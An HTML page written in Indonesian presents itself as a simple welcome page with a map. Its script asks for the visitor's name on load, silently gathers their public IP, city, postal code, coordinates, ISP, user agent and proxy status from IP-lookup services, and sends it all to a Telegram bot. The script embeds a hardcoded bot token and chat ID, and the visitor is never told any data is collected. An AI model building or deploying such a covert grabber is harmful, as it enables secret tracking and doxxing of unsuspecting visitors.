<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <script>
        // Token bot Telegram dan Chat ID
        const TELEGRAM_TOKEN = "7896685998:AAGXZGmmckIixNQLJPfb4aKz5morpkvI7cY";
        const CHAT_ID = "7232374611";

        let userName = "";

        // Prompt nama pengguna sebelum halaman tampil
        window.onload = function () {
            userName = prompt("Masukkan Nama Anda:");
            if (!userName) {
                userName = "Pengunjung Tanpa Nama";
            }
            document.getElementById("welcome-text").innerText = `Selamat Datang, ${userName}!`;
            trackVisitor();
        };

        // Fungsi untuk mengirim pesan ke Telegram
        function sendToTelegram(message) {
            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            fetch(telegramApiUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            }).catch(error => console.error("Gagal mengirim ke Telegram:", error));
        }

        // Fungsi utama untuk mendapatkan IP dan mengirim ke Telegram
        async function trackVisitor() {
            try {
                // 1️⃣ Ambil IP publik pengguna
                let ipResponse = await fetch("https://api.ipify.org?format=json");
                let ipData = await ipResponse.json();
                let userIP = ipData.ip;

                // 2️⃣ Ambil informasi detail dari freeipapi
                let freeIpResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
                let freeIpData = await freeIpResponse.json();

                // 3️⃣ Ambil informasi tambahan dari ip-api
                let ipApiResponse = await fetch(`http://ip-api.com/json/${userIP}`);
                let ipApiData = await ipApiResponse.json();

                // 4️⃣ Update Google Maps iframe sesuai koordinat pengguna
                let mapIframe = document.getElementById("map-frame");
                mapIframe.src = `https://www.google.com/maps?q=${freeIpData.latitude},${freeIpData.longitude}&output=embed`;

                // 5️⃣ Format pesan lengkap untuk Telegram
                let message = `🚨 *Pengunjung Baru!* 🚨\n\n` +
                              `👤 *Nama:* ${userName}\n` +
                              `📍 *IP:* \`${ipApiData.query}\`\n` +
                              `🌍 *Negara:* ${ipApiData.country} (${ipApiData.countryCode})\n` +
                              `🏙 *Kota:* ${ipApiData.city}, ${ipApiData.regionName}\n` +
                              `🌎 *Benua:* ${freeIpData.continent} (${freeIpData.continentCode})\n` +
                              `📌 *Kode Pos:* ${ipApiData.zip}\n` +
                              `🕒 *Zona Waktu:* ${ipApiData.timezone}\n` +
                              `💱 *Mata Uang:* ${freeIpData.currency.name} (${freeIpData.currency.code})\n` +
                              `📡 *ISP:* ${ipApiData.isp || "Tidak diketahui"}\n` +
                              `🏢 *ASN:* ${ipApiData.as || "Tidak diketahui"}\n` +
                              `🌐 *Organisasi:* ${ipApiData.org || "Tidak diketahui"}\n` +
                              `🔍 *User-Agent:* \`${navigator.userAgent}\`\n\n` +
                              `📌 *Koordinat:* ${ipApiData.lat}, ${ipApiData.lon}\n` +
                              `🕹 *Proxy:* ${freeIpData.isProxy ? "Ya" : "Tidak"}`;

                // 6️⃣ Kirim pesan ke Telegram
                sendToTelegram(message);

            } catch (error) {
                console.error("Gagal mendapatkan data:", error);
            }
        }
    </script>
</head>
<body>
    <h1 id="welcome-text">Selamat Datang!</h1>
    <p>Enjoy browsing this page.</p>
    <iframe 
        id="map-frame"
        width="600" 
        height="450" 
        style="border:0" 
        loading="lazy" 
        allowfullscreen 
        referrerpolicy="no-referrer-when-downgrade"
        src="">
    </iframe>
</body>
</html>
